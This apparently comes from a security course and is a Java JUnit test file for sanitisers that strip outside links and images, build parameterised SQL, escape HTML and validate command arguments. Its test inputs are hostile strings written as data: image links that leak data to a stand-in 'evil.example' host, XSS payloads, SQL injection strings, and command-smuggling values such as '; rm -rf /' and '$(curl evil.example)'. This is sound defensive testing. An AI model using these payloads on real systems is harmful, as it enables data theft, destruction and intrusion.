package course.m07security;

import static org.junit.jupiter.api.Assertions.*;

import course.m07security.Html.Source;
import course.m07security.Links.URLPolicy;
import course.m07security.SafeSql.QuerySpec;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;
import java.util.stream.Stream;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

class OutputTest {
    static Stream<Arguments> stripCases() {
        return Stream.of(
                Arguments.of("См. [гайд](https://docs.example.com/sso).", "См. [гайд](https://docs.example.com/sso)."),
                Arguments.of("Поддомен ![](https://img.docs.example.com/a.png)", "Поддомен ![](https://img.docs.example.com/a.png)"),
                Arguments.of("![статус](https://evil.example/p.png?d=секрет)", "[изображение удалено]"),
                Arguments.of("[Подробнее](https://evil.example/r?u=bob \"title\")", "Подробнее"),
                Arguments.of("![x](//evil.example/x.png)", "[изображение удалено]"),
                Arguments.of("![x](h&#116;tps://evil.example/x.png)", "[изображение удалено]"),
                Arguments.of("[x](/\\evil.example/a)", "x"),
                Arguments.of("[жми](javascript:alert(1))", "жми)"), // скобка внутри адреса: ссылка всё равно разрушена
                Arguments.of("[x](https://docs.example.com@evil.example/)", "x"),
                Arguments.of("[x](https://docs.example.com.evil.example/)", "x"),
                Arguments.of("Лого ![l][r]\n[r]: https://evil.example/l.png?q=1", "Лого ![l][r]\n"),
                Arguments.of("![l][r]\n> [r]:\n> //evil.example/l.png", "![l][r]\n"), // в цитате и с адресом на следующей строке
                Arguments.of("![a [b] c](//evil.example/x.png)", "![a [b] c]"), // вложенные скобки в тексте
                Arguments.of("![x\\]y](//evil.example/p.png)", "![x\\]y]"), // экранированная скобка
                Arguments.of("[![a](//evil.example/x.png)](//evil.example/y.png)", "![a]"),
                Arguments.of("зайдите на https://evil.example/c?d=1 срочно", "зайдите на [ссылка удалена] срочно"),
                Arguments.of("<img src=\"https://evil.example/p.png\">", "<img src=\"[ссылка удалена]\">"));
    }

    @ParameterizedTest
    @MethodSource("stripCases")
    void stripLinks(String in, String want) {
        assertEquals(want, Links.strip(in, new URLPolicy(List.of("docs.example.com"))).text());
    }

    @Test
    void buildSelect() throws Exception {
        Map<String, List<String>> s = Map.of("orders", List.of("id", "status", "total", "created_at"));
        var q = new QuerySpec("orders", List.of("id", "status"), Map.of("status", "' OR 1=1 --"), 1000);
        var sel = SafeSql.buildSelect(s, q, "t-42");
        assertEquals("SELECT id, status FROM orders WHERE tenant_id = ? AND status = ? LIMIT 100", sel.sql());
        assertEquals(List.of("t-42", "' OR 1=1 --"), sel.args()); // инъекция осталась значением, а не кодом

        for (QuerySpec bad : List.of(
                new QuerySpec("orders; DROP TABLE orders", List.of("id"), null, 0),
                new QuerySpec("users", List.of("password_hash"), null, 0),
                new QuerySpec("orders", List.of("id", "(SELECT password_hash FROM users)"), null, 0),
                new QuerySpec("orders", List.of("id"), Map.of("1=1 OR tenant_id", "x"), 0))) {
            assertThrows(NotAllowedException.class, () -> SafeSql.buildSelect(s, bad, "t-42"), bad.toString());
        }
    }

    @Test
    void renderAnswer() {
        String out = Html.renderAnswer("Готово <img src=x onerror=alert(1)><script>steal()</script>",
                List.of(new Source("SSO", "https://docs.example.com/sso"), new Source("клик", "javascript:alert(1)")));
        for (String bad : List.of("<script", "<img", "javascript:")) {
            assertFalse(out.contains(bad), "unescaped " + bad + " in " + out);
        }
        assertTrue(out.contains("href=\"#\"") && out.contains("href=\"https://docs.example.com/sso\""), out);
    }

    @Test
    void commandBuild() throws Exception {
        var gitLog = new Command("/usr/bin/git", List.of("log", "--oneline", "-n", "20"),
                Pattern.compile("[A-Za-z0-9_./-]{1,200}"), 3);
        var pb = gitLog.build(List.of("internal/Agent.java"));
        assertEquals(List.of("/usr/bin/git", "log", "--oneline", "-n", "20", "--", "internal/Agent.java"), pb.command());
        assertEquals(Map.of("PATH", "/usr/bin:/bin", "LANG", "C.UTF-8"), pb.environment());

        for (List<String> bad : List.of(
                List.of("Main.java; rm -rf /"),
                List.of("$(curl evil.example)"),
                List.of("--output=/tmp/x"),
                List.of("../../etc/passwd"),
                List.of("a", "b", "c", "d"),
                List.<String>of())) {
            assertThrows(NotAllowedException.class, () -> gitLog.build(bad), bad.toString());
        }
    }
}
